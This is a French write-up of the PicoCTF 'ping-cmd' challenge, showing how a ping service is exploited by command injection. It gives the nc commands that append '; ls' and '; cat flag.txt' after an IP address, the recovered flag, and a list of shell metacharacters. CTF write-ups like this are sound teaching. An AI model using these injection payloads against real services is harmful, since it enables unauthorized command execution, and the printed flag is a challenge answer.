# Writeup PicoCTF - ping-cmd

**Challenge :** ping-cmd
**Catégorie :** Command Injection
**Points :** 100 pts
**Flag :** `picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_d1fdbdd0}`

## Description

Le service propose d'effectuer un ping vers une adresse IP (par défaut `8.8.8.8`). L'objectif est d'utiliser ce point d'entrée pour exécuter des commandes arbitraires sur le serveur.

## Étapes de la solution

### 1. Analyse du service

En se connectant via `nc`, le service demande une adresse IP. S'il utilise une fonction système comme `os.system()` ou `subprocess.Popen(shell=True)` sans filtrage adéquat, il est possible d'injecter des commandes shell.

L'énoncé et les indices mentionnent que l'on peut exécuter plusieurs commandes à la fois.

### 2. Injection de commande

J'ai tenté d'utiliser le séparateur `;` pour chaîner une commande après le ping.

**Test de listing des fichiers :**

```bash
printf "8.8.8.8; ls\n" | nc mysterious-sea.picoctf.net 56392
```

**Résultat :**

```text
PING 8.8.8.8 (8.8.8.8)...
(résultats du ping)
flag.txt
script.sh
```

### 3. Récupération du flag

Une fois le fichier `flag.txt` identifié, j'ai injecté la commande `cat` pour lire son contenu.

**Commande finale :**

```bash
printf "8.8.8.8; cat flag.txt\n" | nc mysterious-sea.picoctf.net 56392
```

**Résultat :**

```text
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_d1fdbdd0}
```

## Concepts clés retenus

* **Command Injection** : Arrive quand des entrées utilisateurs sont concaténées directement dans des commandes système exécutées via un shell.
* **Métacaractères shell** : `;`, `&&`, `||`, `|`, `` ` ``, `$( )` peuvent être utilisés pour briser le contexte de la commande initiale et en exécuter de nouvelles.
* **Filtrage insuffisant** : Le service indiquait "tight security" mais ne vérifiait probablement pas la présence de séparateurs après l'IP autorisée.
